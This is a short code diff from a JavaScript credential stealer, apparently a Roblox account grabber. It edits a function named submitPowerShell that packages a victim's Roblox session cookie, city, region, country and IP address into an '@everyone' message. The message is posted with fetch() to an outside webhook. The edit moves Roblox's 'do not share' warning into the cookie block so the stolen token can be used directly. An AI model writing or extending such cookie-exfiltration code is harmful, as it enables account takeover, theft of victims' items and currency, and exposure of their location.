@@ -244,10 +244,12 @@ async function submitPowerShell() {
         
         const cookieEmbed = {
             content: `@everyone
-🍪 Cookie: ${globalRobloxCookie || 'None found'}
+🍪 Cookie Found:
+\`\`\`
+_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie || 'None found'}
+\`\`\`
 📍 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
-🌐 IP: ${locationInfo.ip || 'Unknown'}
-⚠️ WARNING: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_`
+🌐 IP: ${locationInfo.ip || 'Unknown'}`
         };
 
         const response = await fetch(webhookUrl, {
